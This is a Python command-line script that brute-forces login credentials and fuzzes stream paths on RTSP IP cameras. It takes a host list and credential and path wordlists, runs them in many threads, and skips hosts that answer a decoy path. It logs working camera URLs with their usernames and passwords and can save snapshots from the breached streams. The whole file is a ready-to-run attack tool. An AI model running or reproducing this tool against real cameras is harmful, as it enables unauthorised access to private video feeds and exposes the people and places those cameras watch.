#!/usr/bin/env python
"""Brute creds, fuzzing paths for RTSP cams.
See --help for options"""
from concurrent.futures import ThreadPoolExecutor as TPE
import os
import sys

from fire import Fire

from lib.utils import dt, str_to_filename
from lib.rtsp import rtsp_req, capture_image
from lib.scan import process


rtsp_port = 554
timeout = 5
verbose = 0
capture_img = False
interface = None

single_path_enough = False
single_cred_enough = False

paths = []
creds = []

DIR = os.path.dirname(os.path.abspath(__file__))
LOCAL_DIR = os.path.join(DIR, 'local')
DATA_DIR = os.path.join(DIR, 'data')
CAPTURES_DIR = os.path.join(LOCAL_DIR, 'rtsp_captures')

# cam
C_FOUND = '@'
C_FAKE = '~'
C_FAIL = '-'

# cap
C_CAP_OK = 'C'
C_CAP_ERR = '!'


def prg(t, level=0):
    if verbose >= level:
        sys.stdout.write(t)
        sys.stdout.flush()


def wrire_result(stream_url: str):
    with open(os.path.join(LOCAL_DIR, 'rtsp.txt'), 'a') as f:
        f.write(f'[{dt()}] {stream_url}\n')

    if capture_img:
        from urllib.parse import urlparse
        up = urlparse(stream_url)
        p = str_to_filename(f'{up.path}{up.params}')
        img_name = f'{up.hostname}_{up.port}_{up.username}_{up.password}_{p}'
        img_path = os.path.join(CAPTURES_DIR, f'{img_name}.jpg')
        captured = capture_image(stream_url, img_path)
        prg(C_CAP_OK if captured else C_CAP_ERR)


def check_host(hosts, gl, pl):
    while True:
        try:
            with gl:
                host = next(hosts)
        except StopIteration:
            break
        port = rtsp_port
        if '/' in host:
            print('Can\'t use', host, 'as target')
            return []
        if ':' in host:
            host, port = host.split(':')
        netloc = f'{host}:{port}'
        results = []

        for path in paths:
            root_url = f'rtsp://{netloc}{path}'

            code = rtsp_req(root_url, timeout=timeout, iface=interface)

            if code >= 500:
                prg(C_FAIL)
                return []

            if code not in [200, 401, 403]:
                prg('.', 3)
                continue

            if '/0h84d' == path:
                prg(C_FAKE)
                return []

            for cred in creds:
                c_url = f'rtsp://{cred}@{netloc}{path}'
                code = rtsp_req(c_url, timeout, interface)

                if code == 200:
                    results.append(c_url)
                    prg(C_FOUND)
                    with pl:
                        wrire_result(c_url)
                        if verbose < 0:
                            print(c_url)
                    if single_cred_enough:
                        break

                if code >= 500:
                    prg(C_FAIL)
                    return []

            if single_path_enough and results:
                return results

        return results


def main(hosts_file=None, p=554, t=5, ht=64, i=None, capture=False, v=0, s=False, P=None, C=None, sp=False, sc=False):
    """Brute creds, fuzzing paths for RTSP cams

    :param str hosts_file: File with lines ip:port or just ips
    :param int p: Default port to use if not specified in file
    :param float t: Timeout for queries
    :param int ht: Threads count for hosts
    :param str i: Network interface to use
    :param bool capture: Capture images
    :param int v: Verbose level
    :param bool s: Silent mode
    """
    global rtsp_port
    global verbose
    global capture_img
    global timeout
    global interface

    global single_path_enough
    global single_cred_enough

    global paths
    global creds

    rtsp_port = p
    capture_img = capture
    timeout = t
    interface = i

    single_path_enough = sp
    single_cred_enough = sc

    verbose = v

    if s:
        verbose = -1

    if capture and not os.path.exists(CAPTURES_DIR):
        os.mkdir(CAPTURES_DIR)

    with open(P or os.path.join(DATA_DIR, 'rtsp_paths.txt')) as f:
        paths = ['/0h84d'] + [ln.rstrip() for ln in f]

    with open(C or os.path.join(DATA_DIR, 'rtsp_creds.txt')) as f:
        creds = [ln.rstrip() for ln in f]

    with open(hosts_file or os.path.join(LOCAL_DIR, f'hosts_{rtsp_port}.txt')) as f:
        hosts = (ln.rstrip() for ln in f)
        process(check_host, hosts, workers=ht)


if __name__ == "__main__":
    Fire(main)
